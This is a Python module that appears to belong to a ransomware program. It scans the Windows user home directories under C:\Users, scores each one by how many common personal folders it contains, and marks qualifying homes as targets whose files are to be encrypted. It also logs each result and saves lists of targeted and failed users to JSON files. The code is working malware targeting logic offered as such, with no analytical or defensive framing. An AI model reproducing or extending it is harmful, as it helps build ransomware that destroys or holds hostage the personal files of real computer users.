import json
import os


def get_score(path):
    """
    In a windows os some common folders are placed in the user home dir.
    This function detects how many common folders there are in path.
    """

    common_folders = ['Desktop', 'Downloads', 'Dropbox', 'Music',
                      'Documents', 'Videos', 'Links', 'Favorites', 'Pictures']

    score = 0

    for common_file in common_folders:
        if common_file in path:
            score += 1

    return score


def get_targeted_users(return_failed_users=False, return_succ_users=False):
    """Returns the users home directory who's files are going to be encrypted."""

    failed_users, successful_users = {}, {}
    targeted_users = []

    for item in os.listdir('C:\\Users\\'):
        item_path = 'C:\\Users\\' + item

        if os.path.isdir(item_path):
            try:
                score = get_score(os.listdir('C:\\Users\\' + item))

                if score >= 5:
                    targeted_users.append(item_path)

                    print(f"Successfully encrypted, '{item}'s data.")

                    successful_users[item] = {
                        'User': item,
                        'User path': item_path,
                        'Score': score,
                    }

                else:
                    failed_users[item] = {
                        'User': item,
                        'User path': item_path,
                        'Score': score,
                    }

            except Exception as err:
                print(
                    f"Failed to encrypt, '{item}'s data. Reason: {err.args[-1]}.")

                failed_users[item] = {
                    'User': item,
                    'User path': 'C:\\Users\\' + item,
                    'Error message': str(err),
                    'Brief message': err.args[-1],
                }

    if return_failed_users:
        return failed_users

    elif return_succ_users:
        return successful_users

    return targeted_users


def write_users():
    """Writes the users that failed and succeeded to data/failed_users.json and data/successful_users.json"""

    with open('data/failed_users.json', 'w') as failed_users:
        json.dump(
            get_targeted_users(return_failed_users=True),
            failed_users,
            indent=4,
        )

    with open('data/successful_users.json', 'w') as successful_users:
        json.dump(
            get_targeted_users(return_succ_users=True),
            successful_users,
            indent=4,
        )
